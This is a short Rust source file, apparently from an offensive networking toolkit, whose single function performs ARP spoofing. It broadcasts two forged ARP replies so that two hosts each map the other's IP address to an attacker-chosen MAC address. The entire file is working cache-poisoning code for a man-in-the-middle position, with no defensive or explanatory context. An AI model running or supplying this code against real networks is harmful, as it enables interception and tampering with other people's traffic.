use std::net::Ipv4Addr;

use pnet::datalink::MacAddr;
use pnet::packet::arp::ArpOperations;
use pnet::packet::Packet;

use crate::proto_attack::arp::{Arp, ArpBuilder, Sender};

pub fn attack(spoof_mac: MacAddr, spoof_ip: Ipv4Addr, target_ip: Ipv4Addr, inter_name: &str) {
    let arp_a = Arp::broadcast(spoof_mac, spoof_ip, target_ip, ArpOperations::Reply);
    let arp_b = Arp::broadcast(spoof_mac, target_ip, spoof_ip, ArpOperations::Reply);
    arp_a.send(inter_name);
    arp_b.send(inter_name);
}